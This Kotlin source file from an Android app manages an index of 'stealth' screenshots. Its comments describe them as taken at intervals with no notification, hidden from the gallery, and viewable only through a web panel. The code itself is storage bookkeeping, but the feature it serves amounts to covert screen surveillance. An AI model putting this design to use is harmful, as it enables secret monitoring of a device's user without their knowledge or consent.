package com.ismartcoding.plain.helpers

import android.content.Context
import android.content.SharedPreferences
import com.ismartcoding.plain.MainApp
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.UUID

/**
 * SharedPreferences index over the silent screenshot files saved to the
 * app-private directory `<filesDir>/.PlainPrivate/StealthShots/`.
 *
 * Files never appear in the gallery (they're inside the app sandbox and we
 * also drop a `.nomedia` marker), and the device shows no notification or
 * UI when a capture is taken. Captures are exposed to the web panel only.
 */
object StealthScreenshotHelper {
    private const val PREFS = "plain_stealth_shots"
    private const val K_ENABLED = "enabled"
    private const val K_INTERVAL_MIN = "interval_min"
    private const val K_KEEP = "keep_count"
    private const val K_ENTRIES = "entries"
    const val DEFAULT_INTERVAL_MIN = 15
    const val DEFAULT_KEEP = 200
    const val HARD_MAX_KEEP = 2000

    data class Shot(
        val id: String,
        val ts: Long,
        val packageName: String,
        val appLabel: String,
        val width: Int,
        val height: Int,
        val sizeBytes: Long,
        val absPath: String,
        val manual: Boolean,
    )

    private fun prefs(ctx: Context = MainApp.instance): SharedPreferences =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    fun isEnabled(ctx: Context = MainApp.instance): Boolean =
        prefs(ctx).getBoolean(K_ENABLED, false)

    fun setEnabled(enabled: Boolean, ctx: Context = MainApp.instance) {
        prefs(ctx).edit().putBoolean(K_ENABLED, enabled).apply()
    }

    fun getIntervalMin(ctx: Context = MainApp.instance): Int =
        prefs(ctx).getInt(K_INTERVAL_MIN, DEFAULT_INTERVAL_MIN).coerceIn(1, 360)

    fun setIntervalMin(minutes: Int, ctx: Context = MainApp.instance) {
        prefs(ctx).edit().putInt(K_INTERVAL_MIN, minutes.coerceIn(1, 360)).apply()
    }

    fun getKeepCount(ctx: Context = MainApp.instance): Int =
        prefs(ctx).getInt(K_KEEP, DEFAULT_KEEP).coerceIn(10, HARD_MAX_KEEP)

    fun setKeepCount(keep: Int, ctx: Context = MainApp.instance) {
        prefs(ctx).edit().putInt(K_KEEP, keep.coerceIn(10, HARD_MAX_KEEP)).apply()
    }

    fun shotsDir(ctx: Context = MainApp.instance): File {
        val d = File(ctx.filesDir, ".PlainPrivate/StealthShots")
        if (!d.exists()) d.mkdirs()
        try { File(d, ".nomedia").createNewFile() } catch (_: Throwable) {}
        return d
    }

    @Synchronized
    fun appendShot(
        packageName: String,
        appLabel: String,
        width: Int,
        height: Int,
        sizeBytes: Long,
        absPath: String,
        manual: Boolean,
        ctx: Context = MainApp.instance,
    ): Shot {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val obj = JSONObject().apply {
            put("id", UUID.randomUUID().toString())
            put("ts", System.currentTimeMillis())
            put("packageName", packageName)
            put("appLabel", appLabel)
            put("width", width)
            put("height", height)
            put("sizeBytes", sizeBytes)
            put("absPath", absPath)
            put("manual", manual)
        }
        val merged = JSONArray()
        merged.put(obj)
        for (i in 0 until arr.length()) merged.put(arr.get(i))

        // Trim to keep count: also delete on-disk files that drop off the tail.
        val keep = getKeepCount(ctx)
        if (merged.length() > keep) {
            for (i in keep until merged.length()) {
                try {
                    val path = merged.getJSONObject(i).optString("absPath")
                    if (path.isNotEmpty()) File(path).delete()
                } catch (_: Throwable) {}
            }
            val pruned = JSONArray()
            for (i in 0 until keep) pruned.put(merged.get(i))
            prefs(ctx).edit().putString(K_ENTRIES, pruned.toString()).apply()
        } else {
            prefs(ctx).edit().putString(K_ENTRIES, merged.toString()).apply()
        }
        return Shot(
            id = obj.getString("id"),
            ts = obj.getLong("ts"),
            packageName = packageName,
            appLabel = appLabel,
            width = width,
            height = height,
            sizeBytes = sizeBytes,
            absPath = absPath,
            manual = manual,
        )
    }

    fun list(offset: Int = 0, limit: Int = 60, ctx: Context = MainApp.instance): List<Shot> {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val out = mutableListOf<Shot>()
        var skipped = 0
        var i = 0
        while (i < arr.length() && out.size < limit) {
            try {
                val o = arr.getJSONObject(i)
                if (skipped < offset) skipped++
                else out.add(parseShot(o))
            } catch (_: Throwable) {}
            i++
        }
        return out
    }

    fun count(ctx: Context = MainApp.instance): Int {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        return arr.length()
    }

    fun get(id: String, ctx: Context = MainApp.instance): Shot? {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        for (i in 0 until arr.length()) {
            try {
                val o = arr.getJSONObject(i)
                if (o.optString("id") == id) return parseShot(o)
            } catch (_: Throwable) {}
        }
        return null
    }

    fun deleteOne(id: String, ctx: Context = MainApp.instance): Boolean {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val newArr = JSONArray()
        var removed = false
        var removedPath = ""
        for (i in 0 until arr.length()) {
            try {
                val o = arr.getJSONObject(i)
                if (o.optString("id") == id) { removed = true; removedPath = o.optString("absPath") }
                else newArr.put(o)
            } catch (_: Throwable) {}
        }
        if (removed) {
            prefs(ctx).edit().putString(K_ENTRIES, newArr.toString()).apply()
            try { if (removedPath.isNotEmpty()) File(removedPath).delete() } catch (_: Throwable) {}
        }
        return removed
    }

    fun clearAll(ctx: Context = MainApp.instance) {
        // Wipe the index then nuke every file in the dir.
        prefs(ctx).edit().remove(K_ENTRIES).apply()
        try {
            val dir = shotsDir(ctx)
            dir.listFiles()?.forEach { f -> if (f.name != ".nomedia") f.delete() }
        } catch (_: Throwable) {}
    }

    private fun parseShot(o: JSONObject): Shot = Shot(
        id = o.optString("id"),
        ts = o.optLong("ts"),
        packageName = o.optString("packageName"),
        appLabel = o.optString("appLabel"),
        width = o.optInt("width"),
        height = o.optInt("height"),
        sizeBytes = o.optLong("sizeBytes"),
        absPath = o.optString("absPath"),
        manual = o.optBoolean("manual", false),
    )
}
